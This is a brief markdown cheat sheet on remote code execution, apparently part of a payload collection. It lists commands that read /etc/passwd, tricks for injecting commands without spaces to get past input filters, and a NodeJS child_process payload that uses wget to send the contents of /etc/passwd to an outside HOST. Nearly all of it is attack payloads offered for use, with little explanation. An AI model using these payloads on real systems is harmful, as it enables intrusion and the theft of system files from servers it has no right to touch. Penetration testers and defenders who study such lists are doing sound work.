# Remote Code Execution
Remote code execution is a security vulnerability that allows an attacker to execute codes from a remote server.
	

## Vuln
Normal code execution
```
cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh
```


Code execution without space
```
{cat,/etc/passwd}
cat$IFS/etc/passwd
```

NodeJS Code execution
```
require('child_process').exec('wget+--post-data+"x=$(cat+/etc/passwd)"+HOST')
```

## Thanks to
* 